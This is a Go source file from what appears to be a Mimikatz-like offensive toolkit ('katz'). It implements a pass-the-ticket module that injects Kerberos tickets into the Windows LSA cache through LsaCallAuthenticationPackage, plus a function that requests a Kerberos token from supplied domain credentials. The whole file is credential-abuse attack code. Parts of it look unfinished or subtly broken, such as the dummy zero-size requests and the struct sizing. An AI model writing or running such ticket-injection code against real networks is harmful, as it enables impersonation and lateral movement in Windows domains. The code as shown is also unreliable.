package ptt

import (
	"fmt"
	"unsafe"

	handleHelpers "katz/katz/modules/kerb/ticketdump"

	"golang.org/x/sys/windows"
)


var (
	modSecur32  = windows.NewLazySystemDLL("secur32.dll")
	modKernel32 = windows.NewLazySystemDLL("kernel32.dll")
	advapi32 = windows.NewLazyDLL("advapi32.dll")


	procAcquireCredentialsHandleA      = modSecur32.NewProc("AcquireCredentialsHandleA")
	procInitializeSecurityContextA     = modSecur32.NewProc("InitializeSecurityContextA")
	procLsaCallAuthenticationPackage   = modSecur32.NewProc("LsaCallAuthenticationPackage")
	procLsaLookupAuthenticationPackage = modSecur32.NewProc("LsaLookupAuthenticationPackage")
	procGetLastError              = modKernel32.NewProc("GetLastError")
	procFormatMessage			  = modKernel32.NewProc("FormatMessageW")
	procLocalFree				  = modKernel32.NewProc("LocalFree")
)

func PttMinimal() error {
	handle, err := handleHelpers.GetLsaHandle()
	if err != nil {
		return err
	}
	kerb := handleHelpers.NewLSAString("kerberos")
	pkgName, err := handleHelpers.GetAuthenticationPackage(handle, kerb)

	// Create a dummy LUID
	currLUID := windows.LUID{LowPart: 0, HighPart: 0}

	// Create a dummy KERB_SUBMIT_TKT_REQUEST
	var submitRequest KERB_SUBMIT_TKT_REQUEST
	submitRequest.MessageType = KerbSubmitTicketMessagetype
	submitRequest.LogonId = currLUID
	submitRequest.KerbCredSize = 0 // Set to 0 for testing
	submitRequest.KerbCredOffset = 0 // Set to 0 for testing
	submitRequest.Key = &KERB_CRYPTO_KEY{} // Ensure this is properly initialized

	// Calculate the size of the entire request structure
	requestSize := uint32(unsafe.Sizeof(submitRequest))

	var responsePtr uintptr
	var returnLength uint32
	var protocolStatus uint32

	status, _, err := procLsaCallAuthenticationPackage.Call(
		uintptr(handle),
		uintptr(pkgName), // Use a valid package name
		uintptr(unsafe.Pointer(&submitRequest)),
		uintptr(requestSize), // Convert requestSize to uintptr
		uintptr(unsafe.Pointer(&responsePtr)),
		uintptr(unsafe.Pointer(&returnLength)),
		uintptr(unsafe.Pointer(&protocolStatus)),
	)
	fmt.Println(status==0)
	if status != 0 {
		fmt.Printf("0x%x\n", status)
		return fmt.Errorf("LsaCallAuthenticationPackage failed with status: 0x%x", status)
	}

	fmt.Printf("Status: 0x%x\n", protocolStatus)
	return nil
}



func stringToAnsiPointer(s string) *byte {
	if s == "" {
		return nil
	}
	b := append([]byte(s), 0)
	return &b[0]
}


func LastError() string {
	ret, _, _ := procGetLastError.Call()
	errorCode := uint32(ret)
	if errorCode == 0 {
		return ""
	}
	const FORMAT_MESSAGE_FROM_SYSTEM = 0x00001000
	const FORMAT_MESSAGE_IGNORE_INSERTS = 0x00000200

	var messageBuffer [512]uint16
	size, _, _ := procFormatMessage.Call(
		uintptr(FORMAT_MESSAGE_FROM_SYSTEM|FORMAT_MESSAGE_IGNORE_INSERTS),
		0,
		uintptr(errorCode),
		0,
		uintptr(unsafe.Pointer(&messageBuffer[0])),
		uintptr(len(messageBuffer)),
		0,
	)

	if size == 0 {
		return fmt.Sprintf("Unknown error code: %d", errorCode)
	}
	return fmt.Sprintf("Error %d: %s", errorCode, windows.UTF16ToString(messageBuffer[:]))
}
func Ptt(ticket []byte, handle windows.Handle, currLUID windows.LUID) (error, uintptr) {
	// handle, err := handleHelpers.GetLsaHandle() // Assume this function gets a valid LSA handle
	// if err != nil {

	// 	return err

	// }
	// currLUID, err := handleHelpers.GetCurrentLUID() // Assume this function gets the current LUID
	// if err != nil {
	// 	return err
	// }
	// Ensure ticket fits within max buffer size
	var responsePtr uintptr
	if len(ticket) > 4096 {

		return fmt.Errorf("ticket size exceeds allowed limit"), responsePtr
	}
	
	kerb := handleHelpers.NewLSAString("kerberos")
	pkgName, _ := handleHelpers.GetAuthenticationPackage(handle, kerb)
	var submitRequest KERB_SUBMIT_TKT_REQUEST
	submitRequest.MessageType = KerbSubmitTicketMessagetype
	submitRequest.LogonId = currLUID
	submitRequest.KerbCredSize = uint32(len(ticket))
	submitRequest.KerbCredOffset = uint32(unsafe.Offsetof(submitRequest.TicketData))
	submitRequest.TicketData = ticket // Assign the ticket data

	submitRequest.Key = &KERB_CRYPTO_KEY{} // Initialize the key if needed
	// Calculate the size of the entire request structure
	requestSize := uint32(unsafe.Sizeof(submitRequest))

	
	var returnLength uint32
	var protocolStatus uint32
	// Call the LsaCallAuthenticationPackage function
	status, _, _ := procLsaCallAuthenticationPackage.Call(
		uintptr(handle),

		uintptr(pkgName), // Assume pkgName is defined and valid

		uintptr(unsafe.Pointer(&submitRequest)),

		uintptr(requestSize), // Convert requestSize to uintptr

		uintptr(unsafe.Pointer(&responsePtr)),

		uintptr(unsafe.Pointer(&returnLength)),

		uintptr(unsafe.Pointer(&protocolStatus)),

	)

	if status != 0 {
		fmt.Printf("0x%x\n", status)
		return fmt.Errorf("LsaCallAuthenticationPackage failed with status: 0x%x", status), responsePtr

	}
	// fmt.Printf("Status: 0x%x\n", protocolStatus)

	return nil, responsePtr
}



func TGT(domain, username, password, targetName string) ([]byte, error) {
	var credHandle SECURITY_HANDLE
	var timeStamp TimeStamp

	authIdentity := SEC_WINNT_AUTH_IDENTITY_A{
		User:           stringToAnsiPointer(username),
		UserLength:     uint32(len(username)),
		Domain:         stringToAnsiPointer(domain),
		DomainLength:   uint32(len(domain)),
		Password:       stringToAnsiPointer(password),
		PasswordLength: uint32(len(password)),
		Flags:          SEC_WINNT_AUTH_IDENTITY_ANSI,
	}

	packageName := stringToAnsiPointer("Kerberos")

	status, _, errCall := procAcquireCredentialsHandleA.Call(
		0,
		uintptr(unsafe.Pointer(packageName)),
		SECPKG_CRED_OUTBOUND,
		0,
		uintptr(unsafe.Pointer(&authIdentity)),
		0,
		0,
		uintptr(unsafe.Pointer(&credHandle)),
		uintptr(unsafe.Pointer(&timeStamp)),
	)

	if status != SEC_E_OK {
		winErr, _, _ := procGetLastError.Call()
		return nil, fmt.Errorf("AcquireCredentialsHandleA failed: status=0x%x, winErr=0x%x, err=%v", status, winErr, errCall)
	}

	targetPtr := stringToAnsiPointer(targetName)

	var outBuf SecBuffer
	outBuf.cbBuffer = 2048
	outBuf.BufferType = SECBUFFER_TOKEN
	outBuf.pvBuffer = uintptr(unsafe.Pointer(&make([]byte, outBuf.cbBuffer)[0]))

	var outBufferDesc SecBufferDesc
	outBufferDesc.ulVersion = SECBUFFER_VERSION
	outBufferDesc.cBuffers = 1
	outBufferDesc.pBuffers = uintptr(unsafe.Pointer(&outBuf))

	var contextHandle SECURITY_HANDLE
	var contextAttributes uint32
	contextReqFlags := SECPKG_CRED_OUTBOUND

	status, _, errCall = procInitializeSecurityContextA.Call(
		uintptr(unsafe.Pointer(&credHandle)),
		0,
		uintptr(unsafe.Pointer(targetPtr)),
		uintptr(contextReqFlags),
		0,
		ISC_REQ_DELEGATE|ISC_REQ_MUTUAL_AUTH|ISC_REQ_ALLOCATE_MEMORY, // Kerberos Flags
		// SECURITY_NATIVE_DREP,
		0,
		0,
		uintptr(unsafe.Pointer(&contextHandle)),
		uintptr(unsafe.Pointer(&outBufferDesc)),
		uintptr(unsafe.Pointer(&contextAttributes)),
		uintptr(unsafe.Pointer(&timeStamp)),
	)

	if status != SEC_E_OK && status != SEC_I_CONTINUE_NEEDED {
		winErr, _, _ := procGetLastError.Call()
		return nil, fmt.Errorf("InitializeSecurityContextA failed: status=0x%x, winErr=0x%x, err=%v", status, winErr, errCall)
	}

	// defer procDeleteSecurityContext.Call(uintptr(unsafe.Pointer(&contextHandle)))
	// defer procFreeCredentialsHandle.Call(uintptr(unsafe.Pointer(&credHandle)))

	ticketData := unsafe.Slice((*byte)(unsafe.Pointer(outBuf.pvBuffer)), outBuf.cbBuffer)
	ticketCopy := append([]byte(nil), ticketData...)
	return ticketCopy, nil
}

func Cleanup(ptr uintptr) {
	procLocalFree.Call(ptr)
}